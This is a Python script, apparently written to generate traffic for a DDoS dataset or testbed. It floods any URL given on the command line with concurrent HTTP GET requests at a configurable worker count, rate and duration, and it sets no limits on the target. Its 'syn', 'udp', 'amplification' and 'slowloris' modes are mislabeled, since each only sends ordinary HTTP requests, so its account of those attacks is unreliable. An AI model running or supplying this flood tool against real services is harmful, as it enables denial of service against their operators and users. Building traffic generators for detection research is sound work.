#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import time
import random
from datetime import datetime


class AttackSimulator:
    def __init__(self, target_url: str, attack_type: str, workers: int, duration: int, rate: int):
        self.target_url = target_url
        self.attack_type = attack_type
        self.workers = workers
        self.duration = duration
        self.rate = rate
        self.stats = {'requests': 0, 'errors': 0}
    
    async def execute(self):
        print(f"\n{'='*60}")
        print(f"Attack: {self.attack_type.upper()}")
        print(f"Target: {self.target_url}")
        print(f"Workers: {self.workers} | Rate: {self.rate} req/s/worker | Duration: {self.duration}s")
        print(f"Total Rate: {self.workers * self.rate} req/s")
        print(f"{'='*60}\n")
        
        start = time.time()
        connector = aiohttp.TCPConnector(limit=self.workers * 2, limit_per_host=self.workers)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.worker(session, i) for i in range(self.workers)]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start
        print(f"\nCompleted: {self.stats['requests']:,} requests in {elapsed:.1f}s ({self.stats['requests']/elapsed:.1f} req/s)")
        print(f"Errors: {self.stats['errors']:,}\n")
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        delay = 1.0 / self.rate
        
        while time.time() < end_time:
            try:
                if self.attack_type == 'http-flood':
                    await self._http_flood(session)
                elif self.attack_type == 'syn':
                    await self._syn_flood(session)
                elif self.attack_type == 'udp':
                    await self._udp_flood(session)
                elif self.attack_type == 'slowloris':
                    await self._slowloris(session)
                elif self.attack_type in ['dns', 'ntp', 'ldap', 'mssql']:
                    await self._amplification(session)
                
                self.stats['requests'] += 1
                await asyncio.sleep(delay)
            except:
                self.stats['errors'] += 1
    
    async def _http_flood(self, session):
        async with session.get(self.target_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            await resp.text()
    
    async def _syn_flood(self, session):
        async with session.get(self.target_url, timeout=aiohttp.ClientTimeout(total=1)) as resp:
            pass
    
    async def _udp_flood(self, session):
        asyncio.create_task(self._fire_and_forget(session))
    
    async def _fire_and_forget(self, session):
        try:
            async with session.get(self.target_url, timeout=aiohttp.ClientTimeout(total=0.5)) as resp:
                pass
        except:
            pass
    
    async def _slowloris(self, session):
        async with session.get(self.target_url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            await asyncio.sleep(random.uniform(5, 15))
            await resp.text()
    
    async def _amplification(self, session):
        endpoints = ['/', '/catalogue', '/catalogue/images', '/category.html']
        url = f"{self.target_url}{random.choice(endpoints)}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            await resp.text()


def main():
    parser = argparse.ArgumentParser(description='CIC-DDoS2019 Attack Simulator')
    parser.add_argument('--target-url', required=True, help='Target URL')
    parser.add_argument('--attack-type', required=True, 
                       choices=['http-flood', 'syn', 'udp', 'slowloris', 'dns', 'ntp', 'ldap', 'mssql'],
                       help='Attack type')
    parser.add_argument('--workers', type=int, default=20, help='Number of workers')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--rate', type=int, default=10, help='Requests per second per worker')
    
    args = parser.parse_args()
    attack = AttackSimulator(args.target_url, args.attack_type, args.workers, args.duration, args.rate)
    asyncio.run(attack.execute())


if __name__ == "__main__":
    main()
